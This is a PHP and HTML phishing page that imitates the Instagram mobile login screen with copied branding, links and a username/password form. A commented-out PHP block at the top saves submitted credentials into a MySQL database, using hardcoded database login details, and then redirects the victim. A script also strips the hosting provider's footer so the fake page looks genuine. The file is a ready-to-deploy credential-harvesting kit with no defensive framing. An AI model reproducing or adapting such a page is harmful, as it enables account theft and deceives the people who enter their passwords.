<?php
/*
session_start();
$connect=mysqli_connect('localhost','id14694803_mydb1234','Badwork4-8-8','id14694803_mydata');
if(isset($_POST['login'])) {
    $uname=$_POST['u_name'];
    $upass=$_POST['u_pass'];
    $_SESSION['uname']=$uname;
    $_SESSION['upass']=$upass;
    $query="INSERT INTO mytab (sr,uname,upass) VALUES (null,'$uname','$upass')";
    mysqli_query($connect,$query);    
    header('Location:accountreviewed.php');    
}
*/
?>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0 , user-scalable=no">
    <title>Log In - Instagram</title>
    <style>
        *{font-family: arial;}body{margin:0px;background: white;}.header{font-size:13px;color:white;background:linear-gradient(90deg,purple,red,darkorange);width:100%;height:45px;}.heading1{margin-left:15px;margin-top: 5px;position: absolute;font-weight: bold;}.heading2{margin-top:20px;position:absolute;margin-left:15px;}.get_btn{margin-top:10px;margin-left:85%;background:darkorange;border:1px solid white;color:white;}.lang_selector{font-size:10px;font-weight:bold;color:blue;}.fb{border-radius:3px;line-height:30px;background:royalblue;width:50%;height:30px;min-width:240px;margin-top:50px;color:white;font-size:13px;font-weight: bold;}.inp{height:30px;width:50%;min-width: 240px;background-color:whitesmoke;border:0.1px solid grey;}.inp2{background-color:whitesmoke;border:0.1px solid grey;height:30px;margin-top:5px;width:50%;min-width: 240px;}.pw{font-size:13px;margin-left:53%;}.ln{border-radius: 3px;background:royalblue;color:white;width:50%;min-width:240px;height:30px;font-size:15px;font-weight:bold;border: none;}.link{font-weight:bold;color:royalblue;text-decoration:none;font-size:12px;}.or_sec{width:100%;min-width:210px;color:grey;font-weight:bold;font-size:12px;}::placeholder{font-size:11px;}.pass_link{text-decoration: none;color:royalblue;}.dnt_acc{width:50%;font-size:12px;color:grey;}.footer{width:100%;height:150px;background:whitesmoke;color:grey;}.lnk_btn{text-decoration: none;color:white;}
    </style>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script>
        $(document).ready(function () {$('body').find('img[src$="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"]').parent().closest('a').closest('div').remove();}); 
    </script>
</head>
<body>
<div class="header">
        <p class="heading1">Instagram</p>
        <p class="heading2">Find it for free on Google Play</p>
        <button class="get_btn"><a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en" class="lnk_btn">GET</a></button>
</div>
<center>
        <p class="lang_selector">ENGLISH &downarrow;
        <br><br><br><img src="img/insta.png" width="190" height="70">
<div class="fb">
        <img src="img/fb.jpeg" width="15" height="15"><a href="https://m.facebook.com/dialog/oauth?client_id=124024574287414&redirect_uri=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F&state=%7B%22fbLoginKey%22%3A%22k5rz7q147bl4nis3g4djb29bc1ddmkc1jyaww21nk7nc21sa06fb%22%2C%22fbLoginReturnURL%22%3A%22%2F%22%7D&scope=email&response_type=code%2Cgranted_scopes&locale=en_US" style="color: white;text-decoration:none;"> Continue with Facebook</a>
</div>   
        <br>
        <p class="or_sec">---------------  OR  ---------------
        <br><br><br>
        <form method="POST">
        <input required class="inp" type="text" name="u_name" placeholder="Phone number,username,or email"><br>
        <input required class="inp2" type="password" name="u_pass" placeholder="Password">
</center>
        <p class="pw"><a href="https://www.instagram.com/accounts/password/reset/" class="pass_link">Forgot password?</a></p>
<center>
        <br>
        <input name="login" type="submit" value="Log In" class="ln">
        </form>
        <p class="dnt_acc">Dont have an account?<a class="link" href="https://www.instagram.com/accounts/signup/phone"> Sign up</a></p><br>
        <div class="footer">
            <br>from<br><b style="font-size:13px;letter-spacing:1px;color:black;">FACEBOOK</b>
        </div>
</center>
</body>
</html>